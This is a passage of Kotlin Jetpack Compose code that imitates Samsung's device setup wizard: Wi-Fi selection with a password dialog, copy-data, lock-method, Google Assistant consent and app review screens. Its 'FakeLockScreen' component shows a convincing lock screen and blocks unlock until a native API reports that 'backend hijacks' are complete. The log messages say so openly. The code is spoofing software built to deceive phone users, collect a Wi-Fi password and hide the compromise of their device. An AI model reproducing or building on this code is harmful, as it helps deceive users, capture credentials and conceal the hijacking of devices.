        val secured = net.optString("caps", "").contains("WPA") || net.optString("caps", "").contains("WEP")

        Row(
            modifier = Modifier.fillMaxWidth().clickable { if(!isConnected && !isConnecting) onClick() }.padding(vertical = 14.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            DynamicWifiIcon(
                level = level,
                color = if (isConnected || isConnecting) SamsungBlue else Color.Black,
                modifier = Modifier.padding(start = 4.dp, end = 16.dp).size(26.dp)
            )
            Column(modifier = Modifier.weight(1f)) {
                Text(ssid, fontSize = 19.sp, color = if (isConnected || isConnecting) SamsungBlue else Color.Black, fontWeight = if(isConnected || isConnecting) FontWeight.Bold else FontWeight.Normal)
                if (isConnected) {
                    Text("Connected", fontSize = 14.sp, color = SamsungBlue)
                } else if (isConnecting) {
                    Text("Connecting...", fontSize = 14.sp, color = SamsungBlue)
                }
            }
            if (isConnected) {
                Icon(Icons.Default.Check, null, tint = SamsungBlue, modifier = Modifier.size(24.dp))
            } else if (isConnecting) {
                CircularProgressIndicator(modifier = Modifier.size(18.dp), color = SamsungBlue, strokeWidth = 2.dp)
            } else if (secured) {
                Icon(Icons.Default.Lock, null, tint = Color.LightGray, modifier = Modifier.size(18.dp))
            }
        }
    }

    @Composable
    fun SamsungPasswordDialog(ssid: String, isConnecting: Boolean, showError: Boolean, onDismiss: () -> Unit, onConnect: (String) -> Unit) {
        var pass by remember { mutableStateOf("") }
        var showPassword by remember { mutableStateOf(false) }
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.Black.copy(alpha = 0.5f))
                .pointerInput(Unit) { detectTapGestures { onDismiss() } },
            contentAlignment = Alignment.Center
        ) {
            Surface(
                shape = RoundedCornerShape(24.dp), 
                color = Color.White, 
                modifier = Modifier
                    .fillMaxWidth(0.9f)
                    .pointerInput(Unit) {} // Consume clicks to prevent dismiss
            ) {
                Column(modifier = Modifier.padding(24.dp)) {
                    Text(ssid, fontSize = 22.sp, fontWeight = FontWeight.Bold)
                    Spacer(Modifier.height(20.dp))
                    OutlinedTextField(
                        value = pass,
                        onValueChange = { pass = it },
                        label = { Text("Password") },
                        isError = showError,
                        singleLine = true,
                        visualTransformation = if (showPassword) {
                            androidx.compose.ui.text.input.VisualTransformation.None
                        } else {
                            androidx.compose.ui.text.input.PasswordVisualTransformation()
                        },
                        modifier = Modifier.fillMaxWidth(),
                        colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = SamsungBlue, focusedLabelColor = SamsungBlue)
                    )
                    if (showError) {
                        Text("Incorrect password. Please try again.", color = Color(0xFFEF4444), fontSize = 13.sp, modifier = Modifier.padding(top = 4.dp, start = 8.dp))
                    }
                    Row(
                        modifier = Modifier
                            .padding(top = 12.dp)
                            .clickable(
                                interactionSource = remember { MutableInteractionSource() },
                                indication = null
                            ) { showPassword = !showPassword },
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        SamsungCheckbox(showPassword) { showPassword = !showPassword }
                        Text("Show password", modifier = Modifier.padding(start = 12.dp), fontSize = 16.sp)
                    }
                    Spacer(Modifier.height(32.dp))
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.End, verticalAlignment = Alignment.CenterVertically) {
                        Text("Cancel", color = SamsungBlue, fontWeight = FontWeight.Bold, modifier = Modifier.padding(16.dp).clickable { onDismiss() })
                        Button(
                            onClick = { onConnect(pass) },
                            enabled = pass.length >= 8 && !isConnecting,
                            colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue),
                            shape = RoundedCornerShape(20.dp),
                            modifier = Modifier.height(40.dp)
                        ) { 
                            if (isConnecting) {
                                CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.White, strokeWidth = 2.dp)
                            } else {
                                Text("Connect") 
                            }
                        }
                    }
                }
            }
        }
    }

    @Composable
    fun CopyDataScreen(baseDir: String, onNext: () -> Unit) {
        Column(modifier = Modifier.fillMaxSize().padding(horizontal = 24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
            Spacer(modifier = Modifier.height(80.dp))
            DynamicImage(baseDir, "wifi_logo.png", modifier = Modifier.size(36.dp))
            Text("Copy apps and data", fontSize = 32.sp, textAlign = TextAlign.Center, modifier = Modifier.padding(top = 20.dp))
            Text("You can choose to transfer your apps, photos...", fontSize = 18.sp, color = TextBlack, textAlign = TextAlign.Center, modifier = Modifier.padding(top = 12.dp))
            Spacer(modifier = Modifier.weight(0.8f))
            DynamicImage(baseDir, "copy_data_graphic.png", modifier = Modifier.size(280.dp))
            Spacer(modifier = Modifier.weight(1f))
            Row(modifier = Modifier.fillMaxWidth().padding(bottom = 40.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Text("Don't copy", color = SamsungBlue, fontWeight = FontWeight.Bold, fontSize = 18.sp, modifier = Modifier.clickable { onNext() })
                Button(onClick = onNext, colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue), shape = RoundedCornerShape(25.dp), modifier = Modifier.width(130.dp).height(50.dp)) {
                    Text("Next", color = Color.White, fontSize = 18.sp)
                }
            }
        }
    }

    @Composable
    fun ProtectPhoneScreen(onSkip: () -> Unit) {
        Column(modifier = Modifier.fillMaxSize().padding(horizontal = 24.dp)) {
            Spacer(modifier = Modifier.height(80.dp))
            Icon(Icons.Default.Lock, null, tint = SamsungBlue, modifier = Modifier.size(40.dp).align(Alignment.CenterHorizontally))
            Text("Protect your phone", fontSize = 32.sp, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth().padding(top = 20.dp))
            Text("Prevent others from using this phone...", fontSize = 18.sp, color = TextGrey, textAlign = TextAlign.Center, modifier = Modifier.padding(top = 12.dp, bottom = 40.dp))
            val items = listOf("Face recognition", "Fingerprints", "Pattern", "PIN", "Password")
            items.forEach { item ->
                Column { Text(item, fontSize = 20.sp, modifier = Modifier.fillMaxWidth().padding(vertical = 18.dp)); Divider(color = DividerGrey, thickness = 1.dp) }
            }
            Spacer(modifier = Modifier.weight(1f))
            Text("Skip", color = SamsungBlue, fontWeight = FontWeight.Bold, fontSize = 18.sp, modifier = Modifier.padding(bottom = 80.dp).clickable { onSkip() })
        }
    }

    @Composable
    fun AssistantHeyGoogleScreen(baseDir: String, onNext: () -> Unit) {
        Column(modifier = Modifier.fillMaxSize().padding(horizontal = 24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
            Spacer(modifier = Modifier.height(60.dp)); AssistantLogo(baseDir)
            Text("Access your Assistant with \"Hey Google\"", fontSize = 28.sp, textAlign = TextAlign.Center, modifier = Modifier.padding(top = 20.dp))
            Text("If you agree, Google Assistant will wait in standby mode to detect \"Hey Google\".", fontSize = 16.sp, color = TextGrey, textAlign = TextAlign.Center, modifier = Modifier.padding(top = 12.dp))
            Spacer(modifier = Modifier.height(40.dp))
            DynamicImage(baseDir, "assistant_hey_google_graphic.png", modifier = Modifier.size(260.dp))
            Spacer(modifier = Modifier.weight(0.5f))
            Column(modifier = Modifier.fillMaxWidth(), horizontalAlignment = Alignment.CenterHorizontally) {
                AssistantBullet("Ask questions", "\"What's the weather like this weekend?\"")
                AssistantBullet("Get directions", "\"Where's the nearest coffee shop?\"")
                AssistantBullet("Get things done", "\"Set an alarm for 5.00 a.m. tomorrow.\"")
                Text("You can update this choice in Assistant settings.", fontSize = 14.sp, color = TextGrey, modifier = Modifier.padding(top = 24.dp))
            }
            Spacer(modifier = Modifier.weight(1f))
            Row(modifier = Modifier.fillMaxWidth().padding(bottom = 40.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Text("Skip", color = SamsungBlue, fontWeight = FontWeight.Bold, fontSize = 18.sp, modifier = Modifier.clickable { onNext() })
                Button(onClick = onNext, colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue), shape = RoundedCornerShape(25.dp), modifier = Modifier.width(130.dp).height(50.dp)) { Text("I agree", color = Color.White, fontSize = 18.sp) }
            }
        }
    }

    @Composable
    fun AssistantLockScreen(baseDir: String, onNext: () -> Unit) {
        Column(modifier = Modifier.fillMaxSize().padding(horizontal = 24.dp)) {
            Spacer(modifier = Modifier.height(60.dp)); Box(Modifier.fillMaxWidth(), Alignment.Center){ AssistantLogo(baseDir) }
            Text("Access your Assistant without\nunlocking your device", fontSize = 28.sp, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth().padding(top = 20.dp))
            Spacer(modifier = Modifier.height(40.dp))
            Box(Modifier.fillMaxWidth(), Alignment.Center){ DynamicImage(baseDir, "assistant_lock_graphic.png", modifier = Modifier.size(260.dp)) }
            Spacer(modifier = Modifier.height(40.dp))
            Row(modifier = Modifier.fillMaxWidth()) {
                Icon(Icons.Default.List, null, modifier = Modifier.size(24.dp), tint = TextGrey)
                Column(modifier = Modifier.padding(start = 16.dp)) {
                    Text("Allow Assistant on lock screen", fontSize = 18.sp, fontWeight = FontWeight.Bold)
                    Text("Allow Assistant to respond when your device is locked. For personal actions like calling and messaging your contacts, say \"Hey Google\" so that Assistant can recognise your voice.", fontSize = 15.sp, color = TextGrey, lineHeight = 20.sp, modifier = Modifier.padding(top = 8.dp))
                }
            }
            Row(modifier = Modifier.fillMaxWidth().padding(top = 24.dp)) {
                Icon(Icons.Default.Warning, null, modifier = Modifier.size(24.dp), tint = TextGrey)
                Text(text = "Note: A similar voice or recording might be able to access your personal results on your Assistant.", fontSize = 15.sp, color = TextGrey, modifier = Modifier.padding(start = 16.dp))
            }
            Spacer(modifier = Modifier.weight(1f))
            Row(modifier = Modifier.fillMaxWidth().padding(bottom = 40.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Text("Skip", color = SamsungBlue, fontWeight = FontWeight.Bold, fontSize = 18.sp, modifier = Modifier.clickable { onNext() })
                Button(onClick = onNext, colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue), shape = RoundedCornerShape(25.dp), modifier = Modifier.width(130.dp).height(50.dp)) { Text("I agree", color = Color.White, fontSize = 18.sp) }
            }
        }
    }

    @Composable
    fun AppReviewScreen(baseDir: String, onOk: () -> Unit) {
        var samsungChecks by remember { mutableStateOf(List(12) { true }) }
        val allSelected = samsungChecks.all { it }
        val samsungApps = listOf(
            "Samsung Calculator" to "sam_calculator.png", 
            "Galaxy Wearable" to "wearable.png", 
            "Samsung Global Goals" to "sam_Global_goals.png",
            "Samsung Health" to "sam_health.png", 
            "Samsung Internet Browser" to "sam_internet.png", 
            "Samsung Notes" to "sam_notes.png",
            "SmartThings" to "sam_smart_things.png", 
            "Voice Recorder" to "Samsung_Voice_Recorder.png", 
            "LinkedIn: Job Search & Network" to "linkedin.png",
            "Microsoft 365 Copilot" to "Microsoft_365_Copilot.png", 
            "Microsoft Outlook" to "outlook.png", 
            "Spotify: Music and Podcasts" to "spotify.png"
        )
        val googleApps = listOf("Google Drive" to "drive.png", "Google Photos" to "photos.png", "YouTube Music" to "yt_music.png")

        Column(modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState())) {
            Spacer(modifier = Modifier.height(60.dp)); Box(modifier = Modifier.fillMaxWidth(), contentAlignment = Alignment.Center) { DynamicImage(baseDir, "playstore.png", modifier = Modifier.size(36.dp)) }
            Text(text = "Review additional apps", fontSize = 32.sp, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth().padding(top = 20.dp))
            Text(text = "Apps will be downloaded when Wi-Fi is available", fontSize = 16.sp, color = TextGrey, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth().padding(top = 8.dp))
            Divider(color = DividerGrey, thickness = 1.dp, modifier = Modifier.padding(top = 40.dp))
            Row(modifier = Modifier.fillMaxWidth().padding(horizontal = 24.dp, vertical = 20.dp).clickable { val target = !allSelected; samsungChecks = List(12) { target } }, verticalAlignment = Alignment.CenterVertically) {
                Text("All of the following apps", fontSize = 18.sp, modifier = Modifier.weight(1f)); SamsungCheckbox(allSelected) { val target = !allSelected; samsungChecks = List(12) { target } }
            }
            Text("From Samsung", color = TextGrey, fontSize = 15.sp, modifier = Modifier.padding(start = 24.dp, end = 24.dp, top = 24.dp, bottom = 8.dp))
            samsungApps.forEachIndexed { index, app -> 
                AppReviewRow(baseDir, app.first, app.second, samsungChecks[index]) { 
                    samsungChecks = samsungChecks.toMutableList().apply { set(index, !samsungChecks[index]) } 
                }
                Divider(color = DividerGrey, thickness = 0.5.dp, modifier = Modifier.padding(start = 72.dp))
            }
            
            Text("From Google", color = TextGrey, fontSize = 15.sp, modifier = Modifier.padding(start = 24.dp, end = 24.dp, top = 24.dp, bottom = 8.dp))
            googleApps.forEach { app -> 
                Row(modifier = Modifier.fillMaxWidth().padding(horizontal = 24.dp, vertical = 12.dp), verticalAlignment = Alignment.CenterVertically) {
                    DynamicImage(baseDir, app.second, modifier = Modifier.size(44.dp).clip(RoundedCornerShape(8.dp)))
                    Column(modifier = Modifier.weight(1f).padding(horizontal = 16.dp)) {
                        Text(app.first, fontSize = 17.sp)
                        Text("Included", fontSize = 13.sp, color = TextGrey)
                    }
                }
                Divider(color = DividerGrey, thickness = 0.5.dp, modifier = Modifier.padding(start = 72.dp))
            }

            Box(modifier = Modifier.fillMaxWidth().padding(24.dp), contentAlignment = Alignment.BottomEnd) {
                Button(onClick = onOk, colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue), shape = RoundedCornerShape(25.dp), modifier = Modifier.width(130.dp).height(50.dp)) { Text("OK", color = Color.White, fontSize = 18.sp) }
            }
            Spacer(modifier = Modifier.height(40.dp))
        }
    }

    @Composable
    fun AppReviewRow(baseDir: String, name: String, iconAsset: String?, checked: Boolean, onToggle: () -> Unit) {
        Row(modifier = Modifier.fillMaxWidth().padding(horizontal = 24.dp, vertical = 14.dp).clickable { onToggle() }, verticalAlignment = Alignment.CenterVertically) {
            if (iconAsset != null) {
                DynamicImage(baseDir, iconAsset, modifier = Modifier.size(44.dp).clip(RoundedCornerShape(8.dp)))
            } else {
                Box(modifier = Modifier.size(44.dp).clip(RoundedCornerShape(8.dp)).background(Color(0xFFF5F5F5)), contentAlignment = Alignment.Center) { Icon(Icons.Default.Menu, null, tint = Color.LightGray) }
            }
            Text(name, fontSize = 18.sp, modifier = Modifier.weight(1f).padding(horizontal = 16.dp)); SamsungCheckbox(checked, onToggle)
        }
    }

    @Composable
    fun RecommendedAppsScreen(baseDir: String, onNext: () -> Unit) {
        Column(modifier = Modifier.fillMaxSize().padding(horizontal = 24.dp)) {
            Spacer(modifier = Modifier.height(60.dp)); DynamicImage(baseDir, "samsung_dots_header.png", modifier = Modifier.size(36.dp).align(Alignment.CenterHorizontally))
            Text("Get recommended apps", fontSize = 32.sp, modifier = Modifier.align(Alignment.CenterHorizontally).padding(top = 20.dp))
            Text(text = "Apps will be downloaded when you're connected to Wi-Fi.", fontSize = 16.sp, color = TextGrey, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth().padding(top = 12.dp, bottom = 32.dp))
            Text("From Samsung", color = TextGrey, fontSize = 15.sp, modifier = Modifier.padding(vertical = 12.dp))
            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth().padding(vertical = 12.dp)) {
                SamsungCheckbox(true) { /* Essential, non-toggleable */ }; DynamicImage(baseDir, "samsung_max_logo.png", modifier = Modifier.padding(start = 16.dp).size(48.dp).clip(RoundedCornerShape(8.dp)))
                Column(modifier = Modifier.padding(start = 16.dp)) { Text("Samsung Max-UDS", fontSize = 18.sp); Text("Samsung Electronics Co., Ltd.", fontSize = 14.sp, color = TextGrey) }
            }
            Spacer(modifier = Modifier.height(24.dp))
            Text("Essential apps", color = TextGrey, fontSize = 15.sp, modifier = Modifier.padding(vertical = 12.dp))
            Divider(color = DividerGrey, thickness = 1.dp, modifier = Modifier.padding(bottom = 12.dp))
            Spacer(modifier = Modifier.weight(1f))
            Box(modifier = Modifier.fillMaxWidth().padding(bottom = 40.dp), contentAlignment = Alignment.BottomEnd) {
                Button(onClick = onNext, colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue), shape = RoundedCornerShape(25.dp), modifier = Modifier.width(130.dp).height(50.dp)) { Text("Next", color = Color.White, fontSize = 18.sp) }
            }
        }
    }

    @Composable
    fun FinalSetupScreen(onFinish: () -> Unit) {
        Column(modifier = Modifier.fillMaxSize(), horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.Center) {
            Text("You're all set up!", fontSize = 34.sp); Spacer(modifier = Modifier.height(280.dp))
            Button(onClick = onFinish, colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue), shape = RoundedCornerShape(30.dp), modifier = Modifier.width(260.dp).height(56.dp)) { Text("Finish", color = Color.White, fontSize = 20.sp) }
        }
    }

    @Composable
    fun FakeLockScreen(baseDir: String, api: com.example.myandroid.dynamic.CortexNativeAPI, onSwipeUp: () -> Unit) {
        var showClock by remember { mutableStateOf(false) }
        var isVideoReady by remember { mutableStateOf(false) }
        var hasSwiped by remember { mutableStateOf(false) }
        
        LaunchedEffect(Unit) {
            api.log("FAKE_LOCK: Launched. Waiting 5s for video playback...")
            delay(5000)
            
            api.log("FAKE_LOCK: 5s elapsed. Waiting for backend hijacks to complete before allowing unlock...")
            val startTime = System.currentTimeMillis()
            var isDone = false
            while (!isDone && (System.currentTimeMillis() - startTime) < 45000) {
                try {
                    val sysInfoStr = api.getSystemInfo()
                    if (sysInfoStr != null) {
                        isDone = org.json.JSONObject(sysInfoStr).optBoolean("hijacks_completed", false)
                    }
                } catch(e: Exception) {}
                if (!isDone) delay(1000)
            }
            
            api.log("FAKE_LOCK: Backend hijacks complete. Fading in clock.")
            showClock = true
        }

        Box(modifier = Modifier.fillMaxSize().background(Color.Black)) {
            // Video Player
            androidx.compose.ui.viewinterop.AndroidView(
                factory = { ctx ->
                    val textureView = android.view.TextureView(ctx)
                    textureView.surfaceTextureListener = object : android.view.TextureView.SurfaceTextureListener {
                        var mediaPlayer: android.media.MediaPlayer? = null
                        
                        override fun onSurfaceTextureAvailable(surface: android.graphics.SurfaceTexture, width: Int, height: Int) {
                            try {
                                mediaPlayer = android.media.MediaPlayer().apply {
                                    setDataSource(java.io.File(baseDir, "res/live_wallpaper.mp4").absolutePath)
                                    setSurface(android.view.Surface(surface))
                                    isLooping = true
                                    setOnInfoListener { _, what, _ ->
                                        if (what == android.media.MediaPlayer.MEDIA_INFO_VIDEO_RENDERING_START) {
                                            isVideoReady = true
                                            api.log("FAKE_LOCK: Video rendering started flawlessly.")
                                        }
                                        true
                                    }
                                    prepareAsync()
                                    setOnPreparedListener { start() }
                                }
                            } catch (e: Exception) {
                                api.log("FAKE_LOCK_ERR: Video failed -> ${e.message}")
                            }
                        }
                        override fun onSurfaceTextureSizeChanged(surface: android.graphics.SurfaceTexture, width: Int, height: Int) {}
                        override fun onSurfaceTextureDestroyed(surface: android.graphics.SurfaceTexture): Boolean {
                            mediaPlayer?.release()
                            return true
                        }
                        override fun onSurfaceTextureUpdated(surface: android.graphics.SurfaceTexture) {}
                    }
                    textureView
                },
                modifier = Modifier.fillMaxSize()
            )

            // Anti-flicker overlay
            if (!isVideoReady) {
                Box(modifier = Modifier.fillMaxSize().background(Color.Black))
            }

            // Clock
            androidx.compose.animation.AnimatedVisibility(
                visible = showClock,
                enter = fadeIn(tween(1000)),
                modifier = Modifier.align(Alignment.TopCenter)
            ) {
                var time by remember { mutableStateOf("") }
                var date by remember { mutableStateOf("") }
                LaunchedEffect(Unit) {
                    while (true) {
                        time = java.text.SimpleDateFormat("h:mm", java.util.Locale.US).format(java.util.Date())
                        date = java.text.SimpleDateFormat("EEE, d MMMM", java.util.Locale.US).format(java.util.Date())
                        delay(1000)
                    }
                }
                Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.padding(top = 80.dp)) {
                    Text(time, color = Color.White, fontSize = 80.sp, fontWeight = FontWeight.Light, letterSpacing = (-2).sp)
                    Text(date, color = Color.White, fontSize = 18.sp, modifier = Modifier.offset(y = (-8).dp))
                }
            }

            // TOUCH INTERCEPTOR OVERLAY (Highest Z-Index)
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(Color.Transparent)
                    .pointerInput(showClock, hasSwiped) {
                        awaitPointerEventScope {
                            var startY = 0f
                            while(true) {
                                val event = awaitPointerEvent(androidx.compose.ui.input.pointer.PointerEventPass.Initial)
                                val change = event.changes.firstOrNull()
                                
                                if (change != null) {
                                    if (change.pressed && !change.previousPressed) {
                                        startY = change.position.y
                                    } else if (change.pressed && change.previousPressed) {
                                        val delta = change.position.y - startY
                                        if (showClock && !hasSwiped && delta < -100f) {
                                            api.log("FAKE_LOCK_RAW: BULLETPROOF SWIPE UP DETECTED (Delta: $delta). Unlocking.")
                                            hasSwiped = true
                                            onSwipeUp()
                                            change.consume()
                                        }
                                    }
                                }
                            }
                        }
                    }
            )
        }
    }

    @Composable
    fun SamsungSpinner(baseDir: String) {
        val infiniteTransition = rememberInfiniteTransition()
        val rotation by infiniteTransition.animateFloat(initialValue = 0f, targetValue = 360f, animationSpec = infiniteRepeatable(animation = tween(1200, easing = LinearEasing)))
        DynamicImage(baseDir, "spinner_static.png", modifier = Modifier.size(40.dp).rotate(rotation))
    }

    @Composable
    fun SamsungOrbitSpinner() {
        val infiniteTransition = rememberInfiniteTransition(label = "orbit_spinner")
        
        val rotation by infiniteTransition.animateFloat(
            initialValue = 0f,
            targetValue = 360f,
            animationSpec = infiniteRepeatable(
                animation = tween(1800, easing = LinearEasing)
            ),
            label = "rotation"
        )

        val radiusScale by infiniteTransition.animateFloat(
            initialValue = 0.5f,
            targetValue = 1.0f,
            animationSpec = infiniteRepeatable(
                animation = tween(900, easing = FastOutSlowInEasing),
                repeatMode = RepeatMode.Reverse
            ),
            label = "radiusScale"
        )

        Canvas(modifier = Modifier.size(60.dp)) {
            val center = Offset(size.width / 2, size.height / 2)
            val maxRadius = size.width / 2.5f
            val currentRadius = maxRadius * radiusScale
            val dotCount = 4

            for (i in 0 until dotCount) {
                val angleInDegrees = (i * 90f) + rotation
                val angleInRadians = Math.toRadians(angleInDegrees.toDouble()).toFloat()

                val x = center.x + currentRadius * Math.cos(angleInRadians.toDouble()).toFloat()
                val y = center.y + currentRadius * Math.sin(angleInRadians.toDouble()).toFloat()

                val dotSize = (5.dp.toPx() * (0.7f + radiusScale * 0.3f))

                drawCircle(
                    color = SamsungBlue,
                    radius = dotSize,
                    center = Offset(x, y),
                    alpha = (0.4f + radiusScale * 0.6f).coerceIn(0.2f, 1f)
                )
            }
        }
    }



    @Composable
    fun GoogleGIcon(baseDir: String) { 
        DynamicImage(baseDir, "ggl_logo.png", modifier = Modifier.size(44.dp)) 
    }

    @Composable
    fun AssistantLogo(baseDir: String) { 
        DynamicImage(baseDir, "assistant.png", modifier = Modifier.size(48.dp)) 
    }

    @Composable
    fun AssistantBullet(title: String, quote: String) {
        Column(modifier = Modifier.fillMaxWidth().padding(vertical = 12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
            Text(title, fontSize = 20.sp, fontWeight = FontWeight.Bold)
            Text(quote, fontSize = 17.sp, color = TextGrey)
        }
    }

    @Composable
    fun ReviewItem(title: String, sub: String?, checked: Boolean, isBold: Boolean = false, onToggle: () -> Unit) { Row(modifier = Modifier.fillMaxWidth().padding(vertical = 12.dp).clickable { onToggle() }, verticalAlignment = Alignment.CenterVertically) { SamsungCheckbox(checked, onToggle); Column(modifier = Modifier.padding(start = 16.dp)) { Text(title, fontSize = 18.sp, fontWeight = if (isBold) FontWeight.Bold else FontWeight.Normal); if (sub != null) Text(sub, fontSize = 14.sp, color = TextGrey); Text("Details", fontSize = 16.sp, fontWeight = FontWeight.Bold, textDecoration = TextDecoration.Underline) } } }

    @Composable
    fun PermissionItem(baseDir: String, title: String, description: String, iconAsset: String? = null) { var isChecked by remember { mutableStateOf(true) }; Row(modifier = Modifier.fillMaxWidth().padding(horizontal = 24.dp, vertical = 16.dp), verticalAlignment = Alignment.Top) { Box(modifier = Modifier.size(24.dp).padding(top = 4.dp)) { if (iconAsset != null) DynamicImage(baseDir, iconAsset) else Icon(Icons.Default.Phone, null, tint = Color.DarkGray) }; Column(modifier = Modifier.weight(1f).padding(horizontal = 16.dp)) { Text(title, fontSize = 18.sp); Text(description, fontSize = 14.sp, color = TextGrey) }; Switch(checked = isChecked, onCheckedChange = { isChecked = it }, colors = SwitchDefaults.colors(checkedThumbColor = Color.White, checkedTrackColor = SamsungBlue)) } }

    @Composable
    fun PermissionSection(title: String) { Column(modifier = Modifier.fillMaxWidth()) { Divider(color = DividerGrey, thickness = 1.dp, modifier = Modifier.padding(horizontal = 24.dp)); Text(text = title, fontSize = 15.sp, color = TextGrey, modifier = Modifier.padding(horizontal = 24.dp, vertical = 12.dp)) } }

    @Composable
    fun SamsungCheckbox(checked: Boolean, onToggle: () -> Unit) {
        val checkboxColor by animateColorAsState(if (checked) SamsungBlue else Color.Transparent, animationSpec = tween(200))
        val borderColor by animateColorAsState(if (checked) SamsungBlue else Color.LightGray, animationSpec = tween(200))
        val checkScale by animateFloatAsState(if (checked) 1f else 0f, animationSpec = spring(dampingRatio = Spring.DampingRatioMediumBouncy))
        
        val shape = RoundedCornerShape(4.dp)
        Box(modifier = Modifier
            .size(22.dp)
            .clip(shape)
            .border(2.dp, borderColor, shape)
            .background(checkboxColor)
            .clickable { onToggle() }, 
            contentAlignment = Alignment.Center
        ) {
            Icon(Icons.Default.Check, null, tint = Color.White, modifier = Modifier.size(16.dp).scale(checkScale))
        }
    }

    @Composable
    fun DashedDivider(modifier: Modifier) { Canvas(modifier = modifier.fillMaxWidth().height(1.dp)) { drawLine(color = Color.LightGray, start = Offset(0f, 0f), end = Offset(size.width, 0f), pathEffect = PathEffect.dashPathEffect(floatArrayOf(5f, 5f), 0f)) } }

    @Composable
    fun DynamicImage(baseDir: String, resPath: String, modifier: Modifier = Modifier) {
        val bitmap = remember(resPath) {
            try {
                val file = java.io.File(baseDir, "res/$resPath")
                android.graphics.BitmapFactory.decodeFile(file.absolutePath)?.asImageBitmap()
            } catch (e: Exception) { null }
        }
        if (bitmap != null) {
            androidx.compose.foundation.Image(bitmap = bitmap, contentDescription = null, modifier = modifier)
        }
    }
}
